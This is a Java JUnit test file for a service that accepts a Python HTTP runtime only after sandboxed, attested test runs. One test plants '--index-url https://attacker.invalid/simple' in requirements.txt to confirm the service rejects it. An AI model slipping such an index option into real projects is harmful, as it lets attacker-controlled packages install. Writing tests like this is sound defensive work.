package com.navneet.executespec.workspacegeneration;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;

import com.navneet.executespec.sandbox.SandboxExecResult;
import com.navneet.executespec.sandboxroute.SandboxCommandRoutingService;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class PythonHttpRuntimeAcceptanceServiceTest {

  @TempDir Path workspace;

  private final SandboxCommandRoutingService routing = mock(SandboxCommandRoutingService.class);
  private PythonHttpRuntimeAcceptanceService service;

  @BeforeEach
  void setUp() throws Exception {
    service = new PythonHttpRuntimeAcceptanceService(routing);
    Files.createDirectories(workspace.resolve(".executespec"));
    Files.writeString(workspace.resolve("requirements.txt"), "fastapi\nuvicorn\n");
    when(routing.readiness())
        .thenReturn(
            new SandboxCommandRoutingService.Readiness(
                true, true, true, true, true, true, true, "ready"));
    when(routing.runtimeImageIdentity())
        .thenReturn("registry/executespec-toolchain@sha256:" + "a".repeat(64));
  }

  @Test
  void passesOnlyAnAttestedNonTruncatedOfflineRuntimeExecution() {
    when(routing.execute(
            eq("run-1"),
            eq(workspace),
            eq(java.util.List.of(PythonHttpRuntimeAcceptanceService.RUNTIME_COMMAND)),
            any(Duration.class)))
        .thenReturn(
            SandboxExecResult.completed(
                0,
                "EXECUTESPEC_RUNTIME_KIT=python-http-v1\n2 passed in 0.42s\n",
                "",
                false,
                Duration.ofSeconds(1)));

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.PASSED);
    assertThat(result.executed()).isTrue();
    assertThat(result.passed()).isTrue();
    assertThat(result.testsPassed()).isEqualTo(2);
    assertThat(result.evidence())
        .containsEntry("runtimeKitAttested", true)
        .containsEntry("outputTruncated", false);
  }

  @Test
  void rejectsRequirementOptionsUrlsAndUnallowlistedPackagesBeforeExecution() throws Exception {
    Files.writeString(
        workspace.resolve("requirements.txt"),
        "fastapi\nuvicorn\n--index-url https://attacker.invalid/simple\nrequests\n");

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.FAILED);
    assertThat(result.executed()).isFalse();
    assertThat(result.detail()).contains("unsafe dependency declaration");
    verify(routing, never()).execute(any(), any(), any(), any());
  }

  @Test
  void rejectsAnIncompatibleExactVersionBeforeExecution() throws Exception {
    Files.writeString(workspace.resolve("requirements.txt"), "fastapi==99.0.0\nuvicorn==0.34.3\n");

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.FAILED);
    assertThat(result.detail()).contains("does not satisfy fastapi==99.0.0");
    verify(routing, never()).execute(any(), any(), any(), any());
  }

  @Test
  void rejectsASymlinkedDependencyManifest() throws Exception {
    Path external = workspace.getParent().resolve("external-requirements.txt");
    Files.writeString(external, "fastapi\nuvicorn\n");
    Files.delete(workspace.resolve("requirements.txt"));
    Files.createSymbolicLink(workspace.resolve("requirements.txt"), external);

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.FAILED);
    assertThat(result.detail()).contains("regular non-symlink");
  }

  @Test
  void truncatedOutputCannotBecomeRuntimeProof() {
    when(routing.execute(any(), any(), any(), any()))
        .thenReturn(
            SandboxExecResult.completed(
                0,
                "EXECUTESPEC_RUNTIME_KIT=python-http-v1\n2 passed\n",
                "",
                true,
                Duration.ofSeconds(1)));

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.UNAVAILABLE);
    assertThat(result.passed()).isFalse();
    assertThat(result.detail()).contains("truncated");
  }

  @Test
  void aCompletedRedRuntimeIsDeterministicFailure() {
    when(routing.execute(any(), any(), any(), any()))
        .thenReturn(
            SandboxExecResult.completed(
                1,
                "EXECUTESPEC_RUNTIME_KIT=python-http-v1\n1 failed, 1 passed in 0.3s\n",
                "",
                false,
                Duration.ofSeconds(1)));

    var result = service.verify("run-1", workspace);

    assertThat(result.status()).isEqualTo(PythonHttpRuntimeAcceptanceService.Status.FAILED);
    assertThat(result.executed()).isTrue();
    assertThat(result.testsFailed()).isEqualTo(1);
  }
}
